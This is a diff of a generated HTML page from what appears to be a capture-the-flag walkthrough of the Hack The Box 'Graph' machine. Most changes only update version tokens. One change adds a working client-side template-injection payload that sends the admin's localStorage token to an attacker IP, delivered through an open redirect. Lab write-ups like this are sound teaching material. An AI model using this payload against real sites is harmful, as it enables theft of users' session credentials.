@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.713146078889">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="2.4.0.713146314877">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 2.4.0">
@@ -32,12 +32,12 @@
 
     <script>(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
-    <link href="../../../../resources/css/retype.css?v=2.4.0.713146078889" rel="stylesheet" />
+    <link href="../../../../resources/css/retype.css?v=2.4.0.713146314877" rel="stylesheet" />
 
-    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.4.0.713146078889" data-turbo-eval="false" defer></script>
+    <script type="text/javascript" src="../../../../resources/js/config.js?v=2.4.0.713146314877" data-turbo-eval="false" defer></script>
     <script type="text/javascript" src="../../../../resources/js/retype.js?v=2.4.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.4.0.713146078889" data-turbo-eval="false" defer></script>
-    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.4.0.713146078889" defer></script>
+    <script id="lunr-js" type="text/javascript" src="../../../../resources/js/lunr.js?v=2.4.0.713146314877" data-turbo-eval="false" defer></script>
+    <script id="prism-js" type="text/javascript" src="../../../../resources/js/prism.js?v=2.4.0.713146314877" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -443,7 +443,7 @@ We can use the code playground at <code v-pre>/graphql</code> to retrieve the ad
 request.open('POST','http://internal-api.graph.htb/graphql', false);
 request.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain&quot;);
 request.withCredentials = true;
-request.send(JSON.stringify({operationName: 'update',variables: {firstname: &quot;{{ ERROR }}&quot;,lastname: 'null',id: '62abe72aa6d27a07b20d9653',newusername: 'Sally'},query: 'mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){username,email,id,firstname,lastname,adminToken}}'}));</code></pre>
+request.send(JSON.stringify({operationName: 'update',variables: {firstname: &quot;{$on.constructor('new Image().src=\&quot;http://10.10.14.2/?a=\&quot; + window.localStorage.getItem(\&quot;adminToken\&quot;);')()}&quot;,lastname: 'null',id: '62abe72aa6d27a07b20d9653',newusername: 'Sally'},query: 'mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname:$lastname){username,email,id,firstname,lastname,adminToken}}'}));</code></pre>
 </doc-codeblock></div>
 <p>The above is what we need the admin to execute in his browser. Now we can send all this using the open redirect vulnerability and sending the link in the chat.</p>
 <ol>
